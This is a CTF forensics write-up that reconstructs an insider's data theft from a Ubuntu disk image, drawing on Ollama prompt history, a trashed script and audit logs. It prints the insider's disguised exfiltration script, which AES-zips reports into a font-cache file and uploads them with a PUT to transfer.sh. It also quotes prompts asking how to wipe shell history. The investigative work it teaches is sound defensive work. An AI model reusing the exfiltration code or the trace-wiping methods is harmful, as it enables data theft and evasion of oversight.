---
title: "whisper_evidence: an insider undone by their local LLM history"
date: 2026-10-17 12:00:00 +0600
series: "Black Hat"
platform: "Black Hat CTF"
summary: "A Black Hat forensics challenge: an insider wiped their shell history but not their Ollama prompt history. The prompts give the passphrase, a script in the trash gives the real key derivation, and the encrypted archive gives up the stolen API keys."
description: "A Black Hat forensics challenge: an insider wiped their shell history but not their Ollama prompt history. The prompts give the passphrase, a script in the trash gives the real key derivation, and the encrypted archive gives up the stolen API keys."
tags: ["forensics", "dfir", "linux"]
---

<details class="toc" markdown="1">
<summary>Contents</summary>

* TOC
{:toc}

</details>

{% raw %}
**Category:** Forensics / DFIR (disk-image triage)  
**Artifact:** a logical filesystem capture of an Ubuntu workstation  
**Theme:** the *whispers* in the name are the insider's prompts to a locally-hosted LLM. There is no audio in the image and no reference to OpenAI Whisper anywhere - the "recording" that sinks the suspect is `~/.ollama/history`.

---

## 0. Scenario

An insider on a corporate dev workstation collected sensitive CSV reports, packed them into an AES-encrypted ZIP hidden in a font cache, uploaded it, deleted the tooling, and wiped their shell history. They did *not* wipe the history of the local LLM they used to write the tool.

| | |
|---|---|
| Hostname | `dev-workstation` (VirtualBox VM) |
| OS | Ubuntu 24.04.4 LTS (Noble Numbat), kernel 6.17.0-35-generic |
| Timezone | Europe/Amsterdam (CEST, UTC+02:00) |
| Subject | `dwright` (uid 1000) - David Wright `<dwright@company.com>` |
| LLM | Ollama, `tinyllama:latest`, `llama-server` on `127.0.0.1:65320` |

### Evidence integrity

```bash
sha256sum home/dwright/.cache/fontconfig/session.zip home/dwright/.local/share/Trash/files/cache_mgr.py home/dwright/.ollama/history
```

```
67cc96630e8ab5112ec25c2467481d361c7bcc2373ec0ec5da0417c26506b23d  session.zip
41e11c805040885832b00d97967b8c6c8faa2776c82c24212297104e36483f24  cache_mgr.py
90a392ec3de9b16f703b56ef1353bad7b5226722910a5b17a7dbf0e150b28eb0  history
```

### Tooling

Only `pyzipper` is needed beyond a stock shell. It is not in the standard library - WinZip AES ZIPs are not readable by Python's `zipfile`, nor by most builds of `unzip`.

```bash
pip install pyzipper
```

---

## 1. Triage: separate the capture from the planted evidence

The image is a full `/` copy, so most of it is Ubuntu boilerplate. Two directories are collection output rather than part of the host filesystem, and they are the fastest orientation:

```bash
ls journal_exports/ system_info/
```

```
journal_exports/  journalctl_cron.txt  journalctl_full.txt  journalctl_ollama.txt  journalctl_ssh.txt
system_info/      process_list.txt  network_sockets.txt  last_logins.txt  timers.txt  ...
```

A `journalctl_ollama.txt` in an evidence package is a strong hint about where the challenge wants you to look.

Now look at the subject's home directory:

```bash
ls -la home/dwright/
```

Two things stand out immediately:

```
-rw-r--r--   0 Jun 16 19:07 .bash_history      <-- zero bytes
drwxr-xr-x     Jun 16 18:57 .ollama
```

**`.bash_history` is empty.** Someone cleaned up. That is a finding, not a dead end - it tells you the shell record is gone and you need a different source of user intent.

---

## 2. The pivot: the LLM prompt history

```bash
cat home/dwright/.ollama/history
```

Ollama's REPL keeps a plain-text readline history. It contains ~60 lines, almost all of them mundane Python/DevOps questions - deliberate noise. Five lines are not:

```
write a python script that reads all csv files from a directory and creates an AES encrypted zip archive
use the password Gr33nF0x42!D1amond
also upload the archive to a remote server using requests and delete the script after successful execution
how do I derive an encryption key from a passphrase using hashlib sha256
how to clean the bash history in terminal so there are no traces
```

Grep for the interesting verbs rather than reading all 60 lines:

```bash
grep -inE "encrypt|password|upload|delete|history|zip|traces" home/dwright/.ollama/history
```

This gives us the entire plan, a candidate passphrase, and - critically - the warning that **the passphrase is not used directly**: the suspect asked how to *derive* a key from it.

---

## 3. Find the archive

The prompts describe a ZIP. Find it by content type, not by name - it is deliberately misnamed and hidden in a cache directory:

```bash
find . -type f -exec file {} + 2>/dev/null | grep -i "zip archive" | grep -i AES
```

```
home/dwright/.cache/fontconfig/session.zip: Zip archive data, ... method=AES Encrypted
```

The second `grep` matters: without it you also get eight cached wheels under `~/.cache/pip/http-v2/`, which are ordinary deflate ZIPs. Filtering on `AES` leaves exactly one hit, because nothing in a normal Ubuntu home directory is a WinZip-AES archive.

`~/.cache/fontconfig/` is a plausible-looking place that no one inspects, and `session.zip` is a plausible-looking name. An independent route to the same file - it is the single most recently modified file in the home directory:

```bash
find home/ -type f -printf '%TY-%Tm-%Td %TH:%TM  %p\n' | sort -rn | head -5
```

```
2026-06-20 19:45  home/dwright/.cache/fontconfig/session.zip
2026-06-16 19:07  home/dwright/.bash_history
2026-06-16 19:05  home/dwright/.local/share/Trash/info/quick_analysis.py.trashinfo
2026-06-16 19:05  home/dwright/.local/share/Trash/files/quick_analysis.py
2026-06-16 19:05  home/dwright/.local/share/Trash/files/deploy.sh
```

The archive and the truncated `.bash_history` are the two newest things on the box, four days apart from each other and from everything else. That ordering alone frames the case.

Listing works without the password - ZIP central directories are not encrypted:

```bash
unzip -l home/dwright/.cache/fontconfig/session.zip
```

```
   805332  2026-06-20 15:42   customers_2025.csv
   192509  2026-06-20 15:42   employee_directory.csv
     4704  2026-06-20 15:44   internal_api_keys.csv
    39861  2026-06-20 15:42   revenue_q3.csv
     1077  2026-06-20 15:42   vendor_contracts.csv
```

**The key observation.** Compare the archive contents against the source directory:

```bash
ls data/reports/
```

```
customers_2025.csv  employee_directory.csv  revenue_q3.csv  vendor_contracts.csv
```

Four of five match. **`internal_api_keys.csv` exists only inside the encrypted archive** - it was deleted from disk after packing. That file is the target.

---

## 4. The trap: the passphrase is not the password

The obvious move fails:

```bash
python3 -c "import pyzipper; z=pyzipper.AESZipFile('home/dwright/.cache/fontconfig/session.zip'); z.pwd=b'Gr33nF0x42!D1amond'; z.extractall('out')"
```

```
RuntimeError: Bad password for file 'customers_2025.csv'
```

Expected - the history said *derive*. And the derivation is not the sha256 the suspect asked about, so guessing `sha256(passphrase)` and its variants will also fail. You have to recover the actual script.

---

## 5. Recover the "deleted" script

The prompt said *delete the script after successful execution*. On a Linux desktop, "delete" frequently means the XDG trash - a move, not an unlink. Search for it by content:

```bash
grep -rIl -e "pyzipper" -e "AESZipFile" -e "Gr33nF0x" . 2>/dev/null
```

```
home/dwright/.local/share/.venv/lib/python3.12/site-packages/pyzipper/...   (the venv)
home/dwright/.local/share/Trash/files/cache_mgr.py                          <-- the script
home/dwright/.ollama/history
var/log/audit/audit.log.1
```

```bash
cat home/dwright/.local/share/Trash/files/cache_mgr.py
```

```python
#!/usr/bin/env python3
"""Cache management utility."""
import os, sys, glob, hashlib

# Import from hidden venv
sys.path.insert(0, os.path.expanduser("~/.local/share/.venv/lib/python3.12/site-packages"))
import pyzipper

raw_key = os.environ.get("CACHE_KEY", "")

# Derive actual encryption key from the raw passphrase
ARCHIVE_PASSWORD = hashlib.blake2b(
    raw_key.encode(),
    digest_size=32
).hexdigest()[:20].encode()

DATA_DIR    = os.path.join("/data", "reports")
CACHE_DIR   = os.path.join(os.path.expanduser("~"), ".cache", "fontconfig")
OUTPUT_PATH = os.path.join(CACHE_DIR, "session.zip")

def collect_and_archive():
    csv_files = glob.glob(os.path.join(DATA_DIR, "*.csv"))
    with pyzipper.AESZipFile(OUTPUT_PATH, 'w', compression=pyzipper.ZIP_DEFLATED,
                             encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(ARCHIVE_PASSWORD)
        for fp in csv_files:
            zf.write(fp, os.path.basename(fp))
    return OUTPUT_PATH

def upload(filepath):
    import requests
    with open(filepath, 'rb') as f:
        requests.put("https://transfer.sh/backup.zip", data=f,
                     headers={"Content-Type": "application/octet-stream"}, timeout=30)
```

The trash metadata confirms the provenance and gives us the original path:

```bash
cat home/dwright/.local/share/Trash/info/cache_mgr.py.trashinfo
```

```
[Trash Info]
Path=/home/dwright/cache_mgr.py
DeletionDate=2026-06-16T13:02:46
```

Note that the other ~60 files in `Trash/files/` are dated *2025* and are pure filler (`nginx.conf`, `run_tests.py`, `debug.log`, …). `cache_mgr.py` is the only 2026 entry.

### The derivation

```python
ARCHIVE_PASSWORD = hashlib.blake2b(raw_key.encode(), digest_size=32).hexdigest()[:20]
```

Three deviations from the naive guess, each of which breaks a shortcut:

1. **blake2b**, not the sha256 the suspect asked the LLM about (the prompt history is a red herring on the algorithm).
2. `digest_size=32` - a non-default blake2b output length; the default is 64.
3. `[:20]` - truncated to the first 20 hex characters, not the full digest.

`raw_key` comes from the `CACHE_KEY` environment variable, which is not preserved anywhere in the capture. That is fine: the ollama history supplies its value.

---

## 6. Derive, extract, decode

```bash
python3 -c "import hashlib; print(hashlib.blake2b(b'Gr33nF0x42!D1amond', digest_size=32).hexdigest()[:20])"
```

```
d571fe77618f54b7fca8
```

Extract:

```bash
python3 -c "import pyzipper; z=pyzipper.AESZipFile('home/dwright/.cache/fontconfig/session.zip'); z.pwd=b'd571fe77618f54b7fca8'; z.extractall('extracted'); print(z.namelist())"
```

```
['customers_2025.csv', 'employee_directory.csv', 'internal_api_keys.csv', 'revenue_q3.csv', 'vendor_contracts.csv']
```

The target file's key column is base64:

```bash
head -2 extracted/internal_api_keys.csv
```

```
service,key_b64,environment,owner,team,created,expires,status
payment_gateway_v2,cGtfbGl2ZV84YW04Z3NLOEV0UnM1amJNbk84cWZ2M24=,production,stripe,finance_team,...
```

39 rows, all decoding to realistic-looking vendor keys (`pk_live_…`, `sg_live_…`, `vault_tok_…`). Decode them all and grep:

```bash
awk -F, 'NR>1 {print $2}' extracted/internal_api_keys.csv | while read -r b; do echo "$b" | base64 -d 2>/dev/null; echo; done | grep -E "Flag|\{.*\}"
```

```
BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}
```

It is the `master_vault` row (`owner=vault_root`, `team=security_team`):

```
master_vault,QkhGbGFnWXtsMGM0bF8wbGw0bTRfbGxtX2Y0cjNuNTFjNV8yMDI2fQ==,production,vault_root,security_team,11/1/2024,12/31/2025,Active
```

---

## 7. One-shot solve script

Save as `solve.py` and run from the evidence root.

```python
#!/usr/bin/env python3
"""whisper_evidence - end-to-end solve. Run from the evidence root."""
import base64, csv, hashlib, io, re, pyzipper

PASSPHRASE = "Gr33nF0x42!D1amond"                     # home/dwright/.ollama/history
ZIP_PATH   = "home/dwright/.cache/fontconfig/session.zip"

# Key derivation lifted from Trash/files/cache_mgr.py
password = hashlib.blake2b(PASSPHRASE.encode(), digest_size=32).hexdigest()[:20].encode()
print(f"[+] derived password: {password.decode()}")

with pyzipper.AESZipFile(ZIP_PATH) as z:
    z.pwd = password
    blob = z.read("internal_api_keys.csv").decode()

for row in csv.DictReader(io.StringIO(blob)):
    try:
        dec = base64.b64decode(row["key_b64"]).decode()
    except Exception:
        continue
    if re.search(r"Flag\{|\{.*_.*\}", dec):
        print(f"[+] {row['service']} ({row['owner']}) -> {dec}")
```

```bash
python3 solve.py
```

```
[+] derived password: d571fe77618f54b7fca8
[+] master_vault (vault_root) -> BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}
```

---

## 8. Corroboration: the audit log

The flag does not depend on this, but `var/log/audit/audit.log.1` independently confirms the whole story. An `auditctl` watch had been placed on the data directory, which is why file-level access was recorded:

```bash
grep auditctl var/log/audit/audit.log.1 | grep data_access
```

```
auditctl -w /data/reports/ -p rwxa -k data_access
```

Render the `EXECVE` records from the exfil window in human time. The raw output is dominated by snap/apt background noise, so filter to the commands that matter:

```bash
grep -E '^type=EXECVE' var/log/audit/audit.log.1 | sed -E 's/^type=EXECVE msg=audit\(([0-9]+)\.[0-9]+:[0-9]+\): argc=[0-9]+ /\1 /; s/a[0-9]+=//g; s/"//g' | awk '$1>=1781614700 && $1<=1781615000' | sort -n | uniq | grep -E '^[0-9]+ (python3? -m venv|python |ls |rm -f /data|mv /home)| pip install ' | grep -v 'ls -A' | while read -r t rest; do echo "$(date -u -d @"$t" '+%H:%M:%SZ')  $rest"; done
```

```
12:58:20Z  python3 -m venv /home/dwright/.local/share/.venv
12:59:17Z  ls --color=auto /home/dwright/.local/share/.venv/lib/
12:59:43Z  python /home/dwright/cache_mgr.py
12:59:50Z  ls --color=auto -la /home/dwright/.cache/fontconfig/session.zip
13:00:43Z  rm -f /data/reports/internal_api_keys.csv
13:00:57Z  ls --color=auto /home/dwright/.local/share/Trash/files/
13:00:57Z  mv /home/dwright/cache_mgr.py /home/dwright/.local/share/Trash/files/cache_mgr.py
13:01:06Z  ...  (mv repeated)
13:01:58Z  ...  (mv repeated)
13:02:46Z  mv /home/dwright/cache_mgr.py /home/dwright/.local/share/Trash/files/cache_mgr.py
```

Note the `--color=auto` on the `ls` invocations. That flag comes from the default Ubuntu shell alias, so its presence marks a command a **human typed at an interactive prompt**, as opposed to one a script spawned. Here it shows the operator checking the venv, then confirming the archive landed, then confirming the script reached the trash - three deliberate verification steps, not automation.

Trace the target file specifically:

```bash
grep -n 'name="/data/reports/internal_api_keys.csv"' var/log/audit/audit.log.1
```

```
1545: audit(1781610872...) nametype=CREATE
3310: audit(1781614783...) nametype=NORMAL   comm="python"  SYSCALL=openat
3808: audit(1781614843...) nametype=DELETE   comm="rm"      SYSCALL=unlinkat
```

### Reconstructed timeline (UTC; local = +02:00 CEST)

| Time (UTC) | Event | Source |
|---|---|---|
| 11:54:32 | `/data/reports/internal_api_keys.csv` created | audit `nametype=CREATE` |
| ~12:00-12:57 | Ollama session: ~60 prompts to `tinyllama`, incl. the archive/upload/anti-forensics five | `.ollama/history`, `journalctl_ollama.txt` |
| 12:58:20 | `python3 -m venv /home/dwright/.local/share/.venv` - hidden venv | audit EXECVE |
| 12:58:22 | `pip install pyzipper requests` | audit EXECVE |
| 12:59:43 | `python /home/dwright/cache_mgr.py` - reads all 5 CSVs, writes `session.zip`, PUTs to `transfer.sh` | audit EXECVE + `openat` on each CSV |
| 12:59:50 | `ls -la ~/.cache/fontconfig/session.zip` - operator verifies the archive | audit EXECVE |
| 13:00:43 | `rm /data/reports/internal_api_keys.csv` | audit `unlinkat` / `nametype=DELETE` |
| 13:00:57 → 13:02:46 | `mv ~/cache_mgr.py ~/.local/share/Trash/files/` | audit EXECVE ×4; last matches `.trashinfo` |
| - | `.bash_history` truncated to 0 bytes | filesystem |

### A caveat on reading this log too closely

The audit log is the challenge author's build log as much as the suspect's activity log, and it is worth saying so rather than over-narrating the timeline. Two tells:

- The `mv` into the trash appears **four times** at 13:00:57, 13:01:06, 13:01:58 and 13:02:46. A real user moves a file once. Only the last matches the `.trashinfo` `DeletionDate`, so the earlier three are re-runs during image construction.
- At 13:01:15 the log records the cleanup of the scaffolding itself:

  ```
  rm -f /home/dwright/setup_noise.sh /home/dwright/automate.sh /home/dwright/generate_noise.sh /home/dwright/verify.sh
  rm -f /tmp/collect*.sh /tmp/automate.sh /tmp/generate_noise.sh
  ```

  `generate_noise.sh` is what produced the `/tmp` filler and the ~60 dummy trash files listed under Rabbit holes.

None of this changes the solution - the read-then-delete of `internal_api_keys.csv` and the `cache_mgr.py` execution are single, unambiguous events - but the in-universe story should be told from the first occurrence of each action, not from all four.

### Indicators of compromise

- Exfil endpoint: `https://transfer.sh/backup.zip` (HTTP `PUT`)
- Staging path: `~/.cache/fontconfig/session.zip`
- Hidden venv: `~/.local/share/.venv` (`pyzipper`, `requests`)
- Dropper: `cache_mgr.py`, sha256 `41e11c80…3f24`, masquerading as a "cache management utility"
- Passphrase: `Gr33nF0x42!D1amond` → ZIP password `d571fe77618f54b7fca8`
- Anti-forensics: `.bash_history` truncation, XDG-trash "deletion", cache-directory staging, benign filenames

---

## 9. Rabbit holes

The image is generously salted. None of these lead anywhere:

| Decoy | Why it looks interesting | Reality |
|---|---|---|
| `/tmp/.config_backup_old.tar.gz` (200K) | Named like a backup archive | `file` says `data`; random bytes, no gzip magic |
| `/tmp/core.python3.1234.1781614848` (300K) | A core dump from the exfil window | Random bytes, not ELF |
| `/tmp/.wget-download-c4e2f1.tmp` (250K), `journal-upload.tmp` (500K), `.mozilla_cache.dat`, `.thumbnails_cache`, `.pip-cache-a8f3b2.tmp` | Plausible partial-transfer names | All `data`, all random |
| `/tmp/__pycache__/tempmod.cpython-312.pyc` | Bytecode of the "deleted" script? | 9 bytes: the literal string `compiled\n` |
| `Trash/files/*` (~60 files) | A trash full of scripts and logs | All dated 2025 and inert; only `cache_mgr.py` is 2026 |
| `data/reports/*.csv` | 1 MB of customer/employee/revenue PII | Real content, but plaintext on disk and *not* where the flag is |
| `journalctl_full.txt` (1.4 MB) | Bulk log | Routine desktop noise |
| `~/projects/`, `~/Documents/`, `~/Downloads/` | Meeting notes, VPN setup, Zoom link | Ordinary user files, no secrets |

A quick way to dismiss the `/tmp` set in one shot:

```bash
file tmp/.* tmp/* 2>/dev/null | grep -v directory
```

Anything reporting bare `data` with no recognizable magic is filler.

---

## 10. Takeaways

- **Locally-hosted LLMs keep plaintext prompt histories.** `~/.ollama/history` is a readline file with no rotation and no redaction, and it survives the shell-history cleanup that users actually think to perform. It records *intent*, which conventional artifacts rarely do. Treat it as a first-class DFIR artifact alongside `.bash_history`, `.python_history`, and `.viminfo`.
- **"Deleted" is usually a move.** Check `~/.local/share/Trash/{files,info}/` before assuming carving is required; `.trashinfo` gives you the original path and a deletion timestamp for free.
- **Don't trust stated intent over recovered code.** The suspect asked about sha256; the script used truncated blake2b. The history gives you the secret, but the script gives you the algorithm - you need both.
- **Diff the archive against its source.** The single file present in `session.zip` but absent from `/data/reports/` was the entire point of the challenge, and that comparison costs one `ls`.
- **A file-level audit watch is worth having.** `auditctl -w /data/reports/ -p rwxa` is what turned "a zip appeared" into a defensible read-then-delete timeline.
{% endraw %}
